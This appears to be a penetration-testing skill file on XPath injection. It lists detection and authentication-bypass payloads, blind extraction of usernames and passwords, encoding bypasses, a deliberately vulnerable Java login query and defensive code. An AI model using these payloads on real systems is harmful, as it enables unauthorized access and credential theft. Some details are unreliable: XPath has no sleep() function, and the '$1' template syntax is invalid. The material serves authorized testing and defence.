---
name: xpath-injection-testing
description: Professional methodology and practical checks for XPath injection testing.
version: 1.0.0
---

# XPath Injection Vulnerability Testing

## Overview

XPath injection is similar to SQL injection. It abuses flaws in XPath query construction and may lead to information disclosure, authentication bypass, and related impacts. This skill provides methods for detecting, exploiting, and preventing XPath injection.

## Vulnerability Principle

The application concatenates user input directly into XPath queries without sufficient validation or filtering, allowing an attacker to modify the query logic.

**Dangerous code example:**
```java
String xpath = "//user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(xpath);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## XPath Basics

### Query syntax

**Basic queries:**
```
//user[username='admin']
//user[@id='1']
//user[username='admin' and password='pass']
//user[username='admin' or username='user']
```

### Functions

**Common functions:**
- `text()` - get text content
- `count()` - count nodes
- `substring()` - substring extraction
- `string-length()` - string length
- `contains()` - containment check

## Testing Methods

### 1. Identify XPath input points

**Common features:**
- User login
- Data search
- XML data queries
- Configuration queries

### 2. Basic detection

**Test special characters:**
```
' or '1'='1
' or '1'='1' or '
' or 1=1 or '
') or ('1'='1
```

**Test logical operators:**
```
' or '1'='1
' and '1'='2
' or 1=1 or '
```

### 3. Authentication bypass

**Basic bypass:**
```
Username: admin' or '1'='1
Password: anything
Query: //user[username='admin' or '1'='1' and password='anything']
```

**More precise bypass:**
```
Username: admin') or ('1'='1
Query: //user[username='admin') or ('1'='1' and password='*']
```

### 4. Information disclosure

**Enumerate users:**
```
' or 1=1 or '
' or '1'='1
') or 1=1 or ('
```

**Get node counts:**
```
' or count(//user)>0 or '
```

**Get a specific node:**
```
' or substring(//user[1]/username,1,1)='a' or '
```

## Exploitation Techniques

### Authentication bypass

**Method 1: logical bypass**
```
Input: admin' or '1'='1
Query: //user[username='admin' or '1'='1' and password='*']
Result: matches all users
```

**Method 2: union-style bypass**
```
Input: admin')] | //* | //*[('
Query: //user[username='admin')] | //* | //*[('' and password='*']
```

**Method 3: Boolean blind injection**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,1,1)='b' or '
```

### Information disclosure

**Enumerate all users:**
```
' or 1=1 or '
Result: returns all user nodes
```

**Retrieve usernames:**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,2,1)='d' or '
Retrieve each character step by step
```

**Retrieve passwords:**
```
' or substring(//user[1]/password,1,1)='p' or '
Retrieve password characters step by step
```

### Blind injection techniques

**Time-based blind injection:**
```
' or count(//user[substring(username,1,1)='a'])>0 and sleep(5) or '
```

**Boolean-based blind injection:**
```
' or substring(//user[1]/username,1,1)='a' or '
Observe response differences
```

## Bypass Techniques

### Encoding bypass

**URL encoding:**
```
' or '1'='1 -> %27%20or%20%271%27%3D%271
```

**HTML entity encoding:**
```
' -> &#39;
" -> &quot;
< -> &lt;
> -> &gt;
```

### Comment-style bypass

**Use trailing logic:**
```
' or 1=1 or '
' or '1'='1' or '
```

### Function bypass

**Use different functions:**
```
substring(//user[1]/username,1,1)
substring(//user[position()=1]/username,1,1)
//user[1]/username/text()[1]
```

## Tool Usage

### XPath expression testing

**Interactive tools:**
- XPath Tester
- XMLSpy
- Oxygen XML Editor

### Burp Suite

1. Intercept requests that trigger XPath queries.
2. Modify query parameters.
3. Observe response results.

### Python script

```python
from lxml import etree
from lxml.etree import XPath

# Load the XML document
doc = etree.parse('users.xml')

# Test injection
xpath_expr = "//user[username='admin' or '1'='1']"
xpath = XPath(xpath_expr)
results = xpath(doc)
print(results)
```

## Verification and Reporting

### Verification steps

1. Confirm that the XPath query can be controlled.
2. Verify authentication bypass or information disclosure.
3. Assess impact, such as unauthorized access or data leakage.
4. Record a complete proof of concept.

### Reporting points

- Vulnerable location and input parameter
- XPath query construction method
- Complete exploitation steps and PoC
- Remediation advice, such as input validation and parameterized queries

## Defensive Measures

### Recommended approaches

1. **Input validation**
   ```java
   private static final String[] XPATH_ESCAPE_CHARS =
       {"'", "\"", "[", "]", "(", ")", "=", ">", "<", " "};

   public static String rejectXPathMetaCharacters(String input) {
       if (input == null) {
         return null;
       }
       for (String c : XPATH_ESCAPE_CHARS) {
         if (input.contains(c)) {
           throw new IllegalArgumentException("Invalid XPath input");
         }
       }
       return input;
   }
   ```

2. **Parameterized queries**
   ```java
   // Use XPath variables
   XPath xpathEngine = XPathFactory.newInstance().newXPath();
   xpathEngine.setXPathVariableResolver(new MapVariableResolver(
       Map.of("username", username, "password", password)));
   XPathExpression expr =
       xpathEngine.compile("//user[username=$username and password=$password]");
   ```

3. **Allowlist validation**
   ```java
   // Allow only specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Use precompiled query templates**
   ```java
   // Predefined query template
   private static final String LOGIN_QUERY =
       "//user[username=$1 and password=$2]";

   // Use parameter binding
   ```

5. **Least privilege**
   - Restrict the XPath query scope.
   - Use access control.
   - Restrict queryable nodes.

## Notes

- Test only in authorized environments.
- Account for syntax differences between XPath versions.
- Avoid impacting XML data during testing.
- Understand the target application's XPath implementation.
